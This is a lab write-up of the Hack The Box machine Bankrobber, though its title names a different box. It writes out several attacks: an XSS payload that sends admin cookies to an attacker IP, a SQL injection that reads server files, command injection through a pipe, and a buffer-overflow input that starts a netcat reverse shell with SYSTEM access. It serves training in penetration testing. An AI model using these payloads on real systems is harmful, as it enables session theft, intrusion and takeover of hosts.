# HTB: Forest Writeup w/o Metasploit
![bankrobber](https://user-images.githubusercontent.com/48168337/188629756-091014e6-20cc-4f0c-9540-2a1bb9032dbd.png)

## Introduction
Hey everybody, welcome to this writeup on HTB's Bankrobber box. This machine was pretty challenging and fun at the same time. It was ranked as insane so it may have been more than what most are used to. Anyway, let's jump right into it. 

## Recon
As always, I kicked off a few nmap scans to see what services and ports are available. 

![nmap_scan](https://user-images.githubusercontent.com/48168337/188629985-7a7b8cbf-c5f5-4e10-9ed1-fd0c29c15746.png)

As you can see, we have Web services, SMB, and SQL services available. Let's check out the web services first by opening a browser and navigating to http://10.10.10.154. FYI, it'll help to have Burpsuite open and logging all of our web traffic as we're checking out the web services.


![webpage](https://user-images.githubusercontent.com/48168337/188630629-f59738cd-2730-4840-9fa8-35220ac4b373.png)

The webpage brings us to some cryptocurrency platform. After playing around with the web page, I decided to register and create an account called "test" and log into it. After logging in, you'll notice a "Transfer E-Coin" page; looks like you can transfer cryptocurrency to others using this. The transfer has to be approved by an Admin though. 

![trasnfer_on_hold](https://user-images.githubusercontent.com/48168337/188632981-53acfcf1-a46f-46aa-a361-e18e12758b48.png)

With that in mind, and the comment section on this page, I thought about a XSS (cross site scripting) attack. 

After some fuzzing around, I noticed you can exploit the comment section with XSS scripts. I tested the XSS vulnerability out with a simple script, after it worked, I created some JavaScript to try and steal cookies. I'll skip my test and get to the cookie stealing script. This `<img src=x onerror=this.src="http://10.10.14.8/?cookie="+btoa(document.cookie) />` is the script I used to steal the admin cookies. How or Why does it steal the admin cookies? Well, the script gets executed when the admin approves/denies our transfer. After execution, their cookies are forwarded to our server. For this to work, we'll need a webserver started on our box, I used python `python3 -m http.server 80` to start one up. You'll want this started up before sending the comment with our JavaScript. 

![cookie_stealer](https://user-images.githubusercontent.com/48168337/188634014-bdcb655c-f0e4-4099-abcc-e75312ad1d70.png)

![cookie_stealer_2](https://user-images.githubusercontent.com/48168337/188637185-a8b8eb3b-d4a0-4db8-b33c-4da76e0d0353.png)

It takes about 3-5 minutes for the admin to approve our transaction, simultaneously being affected by our JavaScript. As you can see, the cookies were successfully retrieved and look encoded. They are encoded, with base64. You can decode this with any online tool, Burpsuite, or your terminal. 

![base64-decode](https://user-images.githubusercontent.com/48168337/188637813-8b353bd8-f959-424f-87c3-f893c1f0a55b.png)

![base64-decode_2](https://user-images.githubusercontent.com/48168337/188638461-5d837d03-3a9b-4db9-9d14-c0e523379677.png)

I used my terminal to do the decoding. After decoding the cookie, you'll notice you have to decode the username and password as well. And now we have Admin credentials to log into this web application. 

![admin_login](https://user-images.githubusercontent.com/48168337/188639019-5801279a-60bd-426a-aada-034da908a283.png)

After we log in, we have access to a different interface and tabs. There's a `notes.txt` tab, transactions tab, `search users` tab, and a `security tab`. We learn this is a XAMPP web application after looking at the Notes.txt page. This is good to know. FYI, default location for XAMPP on Windows is `C:/xampp/htdocs`. 

![xampp_server](https://user-images.githubusercontent.com/48168337/188639621-b4b0b801-36a5-4944-b787-048483cf1816.png)

The `search users` tab allows us to query a database for users. After some fuzzing around, we learned that this is vulnerable to SQL Injection attacks. I was able to find a few things, such as other users (`gio`) and their passwords. We were also able to load files from the system; specifically, the file being used by the `backdoorchecker`. What is the backdoorchecker? It's the within the `security tab`, or you can just scroll down the page a bit and you'll find it at the bottom.

![backdoorchecker](https://user-images.githubusercontent.com/48168337/188883159-9e99ae34-9576-41e4-ba2f-c39cfc6bd2a0.png)

![backdoorchecker2](https://user-images.githubusercontent.com/48168337/188883442-09e74bd2-4701-4f84-a211-1cea545e3f98.png)

![backdoorchecker3](https://user-images.githubusercontent.com/48168337/188883408-28245182-3def-485c-8e90-a71dc46e7bae.png)

Apparently, the backdoorchecker.php script allows you to identify backdoors located on the server, but the script can only be used locally. Once again, we were able to load this file using the SQL injection vulnerability in the `search users` input field. If you enter `' UNION SELECT 1,LOAD_FILE('c:/xampp/htdocs/admin/backdoorchecker.php'),3-- -` into the `search users` input field, it will try to load the `backdoorchecker.php` script. It may fail to load using your web browser, so try to do this in repeater using BurpSuite. I have a video walkthrough at the end where you can see me doing this.

![burp_backdoor](https://user-images.githubusercontent.com/48168337/188884523-f17629df-02a8-4105-92e0-b78d915d7e17.png)

The screenshot above (right side) is what the script looks like within burp suite after we send it. Essentially the script is checking/validating credentials and doing some input validation. For instance, it's checking what commands are being used, if they match the `$bad` variable then it error out, if the commands are not coming from `localhost` then error out. 

But the script isn't checking if we're adding a `|` to our command. Remember, we can bypass input validation by piping another command such as `cmd | ping 10.10.10.152`. But we'll still have to do this from localhost so the command can work. Therefore, we'll need to use the same xss vulnerability, so the command looks like it’s coming from the localhost. To accomplish all of this we're going to make a script, you can see it below. 

![xss_nc.js](https://user-images.githubusercontent.com/48168337/189116761-4adc79aa-bfa9-4909-a2f0-62ba9a736408.png)


The script is pretty simple and straightforward. We're setting variables for our request, uri, and cookies (comes from the Burpsuite request). Then we're setting the request to be sent which is piping a netcat connection using `nc.exe` from our smbserver at `10.10.14.8\kali`. We'll call the script using the xss vulnerability, all we have to do is paste xss attack in the same input field as before. Here is what we will be pasting. `<script src="http://10.10.14.8/xss.js></script>`. I named my script xss.js.

Now let’s set up the attack. We'll need an SMBserver to host what the script is using (`nc.exe`). And a webserver to host our script (`xss.js`). 

Below is our smbserver in the left panel, our webserver in the right panel, and a netcat listener on the bottom panel.

![tmux](https://user-images.githubusercontent.com/48168337/189125025-cf5165b5-88c4-4ae9-af73-36c48b1c3612.png)

We started the smbserver with the following command: `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali.` We started our python webserver with `python3 -m http.server 80`. Make sure you start those services in the same directory as your JavaScript (xss.js) and netcat file (nc.exe). You should be able to use the following command to copy netcat to your current directory ` cp /usr/share/windows-resources/binaries/nc.exe  .`.

We can execute our new JavaScript using the same input field from before or you can do it through Burpsuite using repeater. There's a screenshot below to do it both ways. In the Burp screenshot, the payload is url encoded, without the encoding it looks like this: `<script src="http://10.10.14.8/xss.js></script>` Also, I named the script xss.js. 

![burp_request](https://user-images.githubusercontent.com/48168337/189119369-cb9fed02-c552-4c62-afe4-5ad5d8f9ea20.png)

![upload-xss.js](https://user-images.githubusercontent.com/48168337/189122599-5eeef051-13b8-4e8d-b00e-4990b2c99b19.png)

You can see the transaction is waiting to be approved. I sent it a few times because my box was timing out. Now, we just have to wait for it to be executed.

![transaction_xss.js](https://user-images.githubusercontent.com/48168337/189123130-c7b895e4-8a1a-43a2-a3e6-9ae571973c74.png)

And boom! We got a shell. Below you'll see 4 windowpanes. The top left shows the `xss.js` script that is being executed. The bottom left is our smbserver receiving a request from our `xss.js` script. The bottom right is our python webserver hosting the `xss.js` script that's being executed. And finally, the top right is our shell that our `xss.js` script created. 

![shell](https://user-images.githubusercontent.com/48168337/189499322-0c5ee8dd-597d-45e0-ab99-a716697b8c92.png)

Ok, from here we want to get familiar with the system, services, and then maybe the data on it. If we take a look at the netstat output, you'll see port 910 is open. There are a few other ports open as well, most of them we saw from the nmap scans. 910 was pretty interesting because it’s not a standard port. 

![netstat](https://user-images.githubusercontent.com/48168337/189499536-e9d6f80d-4a1c-44bc-b0b9-bf1a0764c04e.png)

I did a quick nmap scan just on that port and didn't get much back, I also couldn't connect to it using netcat. So, we'll have to forward this port back to our local machine, and then try to access whatever service is installed on it from our local machine. 

![nmap910](https://user-images.githubusercontent.com/48168337/189499728-8dc90f91-804e-4a50-8e88-bceb22bfacd4.png)

The tools I used to do the port forwarding is called chisel. It's pretty easy and straightforward. First, we need to download the binaries to our local machine. You can use this link [here](https://github.com/jpillora/chisel/releases) to download a Windows and a Linux version of chisel. I renamed my windows version to chisel.exe and the Linux one to chisel_linux.

Next, we'll have to copy chisel to our victim box. I just copied it from our smbserver using the shell we have.

![copy-chisel](https://user-images.githubusercontent.com/48168337/189499879-e0935780-e2ef-4286-acbb-65e9c2475278.png)

Next, we'll need to start up chisel on our server, and on the client (the victim box). This is what you'll use to start it up on your local system `./chisel_linux server --port 4444 --reverse`. That will start up the server on port 4444 waiting for a reverse connection. And this is what you'll use to start it on your victim box `chisel.exe client 10.10.14.8:4444 R:910:127.0.0.1:910`. That will start up the client to connect to the server on port 4444 and forward 910 on the localhost to the remote host on 910. You can see the same in the screenshots below; the top pane is the windows box (victim), and the bottom pane is our local attacking machine. 

![chisel_listening](https://user-images.githubusercontent.com/48168337/189500120-599c45f8-b049-4b9f-9633-3d5af55a1e63.png)

You can use nmap against your box on 910 to validate the forwarding. 

![validate-port](https://user-images.githubusercontent.com/48168337/189500167-af60c041-f840-4377-8976-a42ccf8b68bf.png)

Now let’s connect to it using netcat and see what it’s about. When we first connect it looks like a cryptocurrency transfer application. 

![nc-connect](https://user-images.githubusercontent.com/48168337/189500215-7df830d6-ee12-499e-b9d1-74a2f1a0f056.png)

And it's asking us for a 4-digit code. I tried fuzzing around to guess the code, none of it worked so we used a script to brute force the code. 

![brute-py](https://user-images.githubusercontent.com/48168337/189500468-1b551b89-32a3-489b-99fe-0e40037c6bde.png)

The script is pretty simple. It's looping through a range of numbers (from 0 to 9999) and trying every 4-digit combination until we do not get `"Access denied"`. Why `Access denied`? Because that's the message you get when you enter the wrong code.

![access-denied](https://user-images.githubusercontent.com/48168337/189500393-89594022-87a5-48af-83c9-4ca70ac9ffd3.png)

All you have to do is execute the script with `python3 brute.py`. 

Eventually, you'll get the correct code. 

![brute-code](https://user-images.githubusercontent.com/48168337/189500497-b34e1605-f1f2-42a5-a000-3faec8506f9e.png)


And it works!

![correct-code](https://user-images.githubusercontent.com/48168337/189500542-33c0b0ac-34dd-49e3-bdef-a5982cdbdfa3.png)

Now it's asking us to enter the number of coins we want to send. When you send an amount, the output shows you where the transfer tool is running from `C:\Users\admin\Documents\transfer.exe`. 

![transfer-money](https://user-images.githubusercontent.com/48168337/189500572-dc558ba1-37f4-4d54-a490-58b30639bc88.png)


When you give the app 100 letter `A's`, the letters overwrite where the transfer tool is running from. 

![100-A](https://user-images.githubusercontent.com/48168337/189500610-0d129ecf-2f87-42b4-9f60-941d0969da92.png)

if we can figure out the exact amount of `A's` or characters we need to overwrite that location, maybe we can put our own there? That's exactly what we'll do and needs to get done to exploit this buffer overflow vulnerability. 

What we'll do is use `msf_pattern_create` to create a 100 chars. Pass those 100 characters through the e-coin transfer tool as an amount (instead of the 100 A's). We'll copy the first few characters that overwrote the e-transfer tool's location and pass it through `msf_pattern_offset`. It'll tell us the exact number of characters it took to overwrite that location, which is 32 characters. 

![32-letter-A](https://user-images.githubusercontent.com/48168337/189500712-96034671-82ee-400d-b94d-bf09164d2914.png)

With all of this information, if we pass 32 characters and then a location of our choice, we might be able to elevate our privileges to `admin`. Why `admin`? Because this tool is running from the `admin` directory. 

What I did to accomplish this was pass 32 `A's` followed by `C:\Users\Cortin\Downloads\nc.exe 10.10.14.8 5678 -e cmd.exe`. So essentially, it'll be executing a netcat connection to our system on port `5678` using a `nc.exe` executable we'll need to transfer to `C:\Users\Cortin\Downloads\`. 

This is the entire input `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC:\Users\Cortin\Downloads\nc.exe 10.10.14.8 5678 -e cmd`. 

Here is the copy command we use to transfer `nc.exe`. 

![copy-nc](https://user-images.githubusercontent.com/48168337/189501534-e45b8e1e-7ab9-4892-87f4-0949c73e1e82.png)

Here is our input overwriting the transfer application's current location.

![nc-overwrote](https://user-images.githubusercontent.com/48168337/189501624-f2e3049c-4c99-4426-be4e-9dd61600a855.png)

Here is our shell with System level access. 

![system](https://user-images.githubusercontent.com/48168337/189501673-045212aa-7c2a-4bc5-ba76-8944ca0128bb.png)

And we're done! This was a pretty tough and fun box. I definitely had to exhaust a lot of external resources to finish capturing the flags. There were really good vulnerabilities on this box from the initial cross site scripting vulnerability we exploited to get our initial shell. There was even a SQL injection vulnerability on the same web application, we used it to load files from the system; like the `backdoorchecker.php` script. I think good input validation would have prevented most of it not all of those vulnerabilities from being exploited. There's no reason users should be able to pass JavaScript or SQL queries through input fields. We were able to get that final shell due to a buffer overflow vulnerability in e-coin transfer tool; and it was running as Administrator! Secure coding practices, like limiting the number of characters users can input, should be implemented to prevent this privilege escalation attack. All in all, this was a great box, probably my favorite so far. [Here](https://www.youtube.com/watch?v=MuWZpSatUmU) is a link to the video walkthrough.
